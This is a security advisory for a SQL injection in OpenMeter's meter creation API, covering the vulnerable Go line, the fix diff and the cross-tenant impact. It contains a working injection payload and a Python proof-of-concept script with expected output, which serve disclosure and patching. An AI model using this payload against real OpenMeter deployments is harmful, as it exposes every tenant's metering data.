# [M] OpenMeter: SQL injection through meter creation

## Summary
Severity: Medium
Advisory: GHSA-wc3v-3457-c8cm
CVE: CVE-2026-8462
CWE: CWE-89
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-04
Source: https://github.com/advisories/GHSA-wc3v-3457-c8cm
Type: github-advisory

## Affected
- Go: `github.com/openmeterio/openmeter` — affected >=0 <1.0.0-beta.228

## Details
### Summary

An authenticated tenant can inject arbitrary SQL through the `valueProperty` or `groupBy` fields of `POST /api/v1/meters`. The injection passes the application's JSONPath validation check and executes against the shared ClickHouse database, which contains event data for all tenants with no row-level security. Any authenticated tenant can read or write every other tenant's metering data.

### Details

`openmeter/streaming/clickhouse/utils_query.go:15` builds a ClickHouse `SELECT` by interpolating user input with `fmt.Sprintf`:

```go
sb.Select(fmt.Sprintf("JSON_VALUE('{}', '%s')", sqlbuilder.Escape(d.jsonPath)))
```

`sqlbuilder.Escape()` (go-sqlbuilder v1.40.2) only replaces `$` → `$$` to prevent collisions with the library's own argument placeholders. It does not escape single quotes. A single quote in the input closes the string literal, and subsequent tokens execute as raw SQL. `sb.Build()` always returns an empty `args` slice — the query is never parameterized.

The payload must be prefixed with a valid JSONPath expression (e.g. `$.foo`) because ClickHouse raises error code 36 (BAD_ARGUMENTS) on an empty JSONPath string, which `ValidateJSONPath` silently treats as "invalid JSONPath" and returns early — before the injected branch can execute.

Working payload:
```
$.foo') UNION ALL SELECT toString(sleep(3)) FROM system.one --
```

Generated SQL:
```sql
SELECT JSON_VALUE('{}', '$.foo') UNION ALL SELECT toString(sleep(3)) FROM system.one --'
```

Fix — replace `fmt.Sprintf` string interpolation with `sb.Var()`, which appends the value to the builder's args list and emits a `?` placeholder:

```diff
-sb.Select(fmt.Sprintf("JSON_VALUE('{}', '%s')", sqlbuilder.Escape(d.jsonPath)))
+sb.Select(fmt.Sprintf("JSON_VALUE('{}', %s)", sb.Var(d.jsonPath)))
```

### PoC

`poc.py`:

```python
import json, time, uuid
from urllib.request import Request, urlopen

SLEEP   = 3
API     = "http://localhost:48888"
PAYLOAD = f"$.foo') UNION ALL SELECT toString(sleep({SLEEP})) FROM system.one --"

def post_meter(value_property):
    body = json.dumps({
        "slug":          f"poc_{uuid.uuid4().hex[:8]}",
        "eventType":     "x",
        "aggregation":   "SUM",
        "valueProperty": value_property,
    }).encode()
    req = Request(f"{API}/api/v1/meters", data=body,
                  headers={"Content-Type": "application/json"}, method="POST")
    t0 = time.monotonic()
    with urlopen(req, timeout=SLEEP + 10) as r:
        return r.status, time.monotonic() - t0

_, baseline = post_meter("$.tokens")
status, elapsed = post_meter(PAYLOAD)

print(f"baseline : {baseline:.3f}s")
print(f"injected : {elapsed:.3f}s  (HTTP {status})")
print(f"result   : sleep({SLEEP}) {'CONFIRMED' if elapsed >= baseline + SLEEP - 0.5 else 'not confirmed'}")
```

```shell
docker compose up -d
until curl -sf http://localhost:48888/api/v1/meters > /dev/null; do sleep 3; done
python3 poc.py
```

Expected output:
```
baseline : 0.036s
injected : 3.031s  (HTTP 200)
result   : sleep(3) CONFIRMED
```

### Impact

SQL injection via `POST /api/v1/meters` (`valueProperty` or `groupBy`). Requires a valid tenant API key; no other preconditions. The shared `openmeter.om_events` table has no row-level security — a successful injection gives unrestricted read access to all tenants' event subjects, types, payloads, and timestamps. Write access is subject to the ClickHouse user's grants. Denial of service via resource-exhausting queries is also possible.

### Attribution
This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by Shoshana Makinen at Anvil Secure in collaboration with Anthropic Research.

For CVE credits and public acknowledgments: Anvil Secure in collaboration with Claude and Anthropic Research

## References
- https://github.com/openmeterio/openmeter/security/advisories/GHSA-wc3v-3457-c8cm
- https://github.com/openmeterio/openmeter/pull/4383
- https://github.com/openmeterio/openmeter/commit/6ce29e743165890c10346f4c71d5bf79f1ecaf6f
- https://github.com/openmeterio/openmeter
- https://github.com/openmeterio/openmeter/releases/tag/v1.0.0-beta.228
